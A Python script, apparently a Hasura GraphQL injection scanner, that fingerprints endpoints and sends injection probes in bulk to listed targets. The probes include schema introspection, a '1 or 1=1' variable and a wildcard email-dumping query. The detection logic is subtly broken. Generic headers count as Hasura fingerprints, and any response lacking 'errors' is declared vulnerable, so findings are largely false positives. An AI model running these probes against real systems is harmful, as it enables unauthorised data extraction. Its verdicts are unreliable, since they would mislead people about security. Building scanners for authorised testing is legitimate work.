#!/usr/bin/env python3
"""
Hasura GraphQL Injection Scanner
=================================
Scans for GraphQL Injection vulnerabilities in Hasura GraphQL APIs 
and optionally attempts to exploit identified vulnerabilities.

This script helps uncover issues in GraphQL endpoints exposed by 
Hasura, a popular GraphQL engine often used in modern applications. 
GraphQL Injection vulnerabilities arise when insecure handling of 
user-supplied input in GraphQL queries or variables allows injection 
of malicious queries. A successful injection could compromise 
sensitive data or allow unauthorized actions.

This scanner:
  1. Evaluates endpoints for Hasura-specific GraphQL API fingerprints.
  2. Extracts the server version from API responses.
  3. Tests query or mutation operations for potential injection paths.
  4. Active probes for vulnerable behavior unless the --safe flag is specified.

Usage:
  # Scan a single endpoint for GraphQL Injection vulnerabilities
  python hasura_graphql_injection_scanner.py --target https://hasura.example.com/v1/graphql

  # Detection only — no injection probes
  python hasura_graphql_injection_scanner.py --target https://hasura.example.com/v1/graphql --safe

  # Scan multiple GraphQL APIs listed in a file
  python hasura_graphql_injection_scanner.py --list hasura_endpoints.txt --output findings.json

  # Increase concurrency and disable TLS verification
  python hasura_graphql_injection_scanner.py --list hasura_endpoints.txt --concurrency 50 --no-verify

References:
  - https://hasura.io/
  - https://portswigger.net/web-security/graphql
  - https://nvd.nist.gov/vuln/search/results?form_type=basic&search=graphql&results_type=overview

"""

import asyncio
import json
import re
import sys
import argparse
from datetime import datetime, timezone
from typing import Optional

import httpx

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

TOOL_NAME = "hasura_graphql_injection_scanner"
CVE_ID = "N/A"
REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 30

# Hasura-specific fingerprints from the GraphQL endpoint response headers and body
HASURA_FINGERPRINTS = {
    "headers": ["x-hasura-role", "x-request-id", "Access-Control-Allow-Origin"],
    "body": ["\"errors\"", "\"extensions\"", "hasura"]
}

# Sample malicious queries to test injection
INJECTION_QUERIES = [
    {"query": "query { __schema { types { name } } }"},  # Introspection schema query
    {"query": 'query { users (where: {id: {_eq: 1} }) { id } }', "variables": '{"id": "1 or 1=1"}'},
    {"query": 'query { users (where: {email: {_like: "%"}}) { email } }'}
]

# ── Scanner ───────────────────────────────────────────────────────────────────

class HasuraGraphQLInjectionScanner:
    def __init__(self, concurrency: int, no_verify: bool):
        self.semaphore = asyncio.Semaphore(concurrency)
        self.no_verify = no_verify
        self.http_headers = {
            "Content-Type": "application/json",
            "User-Agent": f"{TOOL_NAME}/1.0"
        }

    async def fetch(self, client: httpx.AsyncClient, url: str, json_payload: dict = None) -> Optional[httpx.Response]:
        """Send an HTTP request with optional JSON payload."""
        try:
            async with self.semaphore:
                response = await client.post(url, json=json_payload, headers=self.http_headers)
                return response
        except httpx.RequestError as e:
            print(c(RED, f"[ERROR] {url} - Request failed: {e}"))
            return None

    async def detect_server(self, client: httpx.AsyncClient, url: str) -> Optional[str]:
        """Check if the target is running Hasura and extract its version."""
        try:
            response = await self.fetch(client, url, INJECTION_QUERIES[0])
            if not response or response.status_code != 200:
                return None
            
            headers = response.headers
            body = response.text.lower()
            if any(fp in str(headers).lower() for fp in HASURA_FINGERPRINTS["headers"]) or \
               any(fp in body for fp in HASURA_FINGERPRINTS["body"]):
                version = self.extract_version(headers)
                return version if version else "Unknown"
        except Exception as e:
            print(c(RED, f"[ERROR] Failed detection: {e}"))
        return None

    @staticmethod
    def extract_version(headers: httpx.Headers) -> Optional[str]:
        """Extract Hasura version from headers, if present."""
        for key, value in headers.items():
            if "x-hasura-version" in key.lower():
                return value
        return None

    async def test_injection(self, client: httpx.AsyncClient, url: str) -> bool:
        """Test for GraphQL Injection vulnerability."""
        for payload in INJECTION_QUERIES:
            response = await self.fetch(client, url, payload)
            if response and "errors" not in response.text:
                print(c(YELLOW, f"[VULNERABLE] GraphQL Injection detected on {url}"))
                return True
        return False

    async def scan_target(self, target: str, safe_mode: bool) -> dict:
        """Perform detection and optional probing of a single target."""
        print(c(CYAN, f"[INFO] Scanning: {target}..."))
        async with httpx.AsyncClient(verify=not self.no_verify, timeout=REQUEST_TIMEOUT) as client:
            version = await self.detect_server(client, target)
            if version:
                print(c(GREEN, f"[INFO] {target} is running Hasura (version: {version})"))
                if not safe_mode:
                    vulnerable = await self.test_injection(client, target)
                    return {"target": target, "vulnerable": vulnerable, "version": version}
                return {"target": target, "vulnerable": False, "version": version}
            else:
                print(c(YELLOW, f"[INFO] No Hasura server detected at {target}"))
                return {"target": target, "vulnerable": False, "version": None}


async def main():
    parser = argparse.ArgumentParser(description="Hasura GraphQL Injection Scanner")
    parser.add_argument("--target", help="Single target GraphQL endpoint")
    parser.add_argument("--list", help="File containing a list of targets")
    parser.add_argument("--output", help="Output file to save scan results as JSON")
    parser.add_argument("--safe", action="store_true", help="Detection only without active probing")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Concurrency level (default: 30)")
    parser.add_argument("--no-verify", action="store_true", help="Disable TLS verification")
    
    args = parser.parse_args()
    if not args.target and not args.list:
        print(c(RED, "You must specify a target with --target or a file with --list"))
        sys.exit(1)

    targets = []
    if args.target:
        targets.append(args.target)
    if args.list:
        try:
            with open(args.list, "r") as f:
                targets.extend(line.strip() for line in f.readlines() if line.strip())
        except FileNotFoundError:
            print(c(RED, f"Error: File not found - {args.list}"))
            sys.exit(1)
    
    scanner = HasuraGraphQLInjectionScanner(concurrency=args.concurrency, no_verify=args.no_verify)
    results = []

    tasks = [scanner.scan_target(target, args.safe) for target in targets]
    for result in await asyncio.gather(*tasks):
        results.append(result)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
    
    print(c(BOLD + GREEN, f"\n[INFO] Scan complete. Results: {len(results)} targets scanned."))
    if args.output:
        print(c(GREEN, f"[INFO] Results saved to {args.output}."))


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(c(RED, "\n[ERROR] Scan aborted by user."))
